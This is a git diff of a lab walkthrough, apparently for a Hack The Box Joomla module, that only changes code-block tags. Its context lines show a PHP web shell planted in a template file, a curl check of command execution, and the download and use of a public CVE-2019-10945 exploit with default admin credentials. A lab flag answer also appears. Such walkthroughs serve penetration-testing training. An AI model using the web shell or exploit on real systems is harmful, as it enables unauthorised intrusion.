@@ -22,7 +22,7 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 
 Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.
 
-```sh
+```shellsession
 $ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -31,11 +31,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## Questions
 1. Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application **Answer: j00mla_c0re_d1rtrav3rsal!**
    - Pull PoC for CVE-2019-10945:
-        ```sh
+        ```shellsession
         $ wget https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py
         ```
    - Run the exploit with `admin`:`admin` credential:
-        ```sh
+        ```shellsession
         $ python CVE-2019-10945.py --url http://dev.inlanefreight.local/administrator/ --username admin --password admin
         /home/htb-ac-1863259/CVE-2019-10945.py:52: SyntaxWarning: invalid escape sequence '\ '
         | |  | |   /\   |  _ \ / __ \ / __ \|  _ \
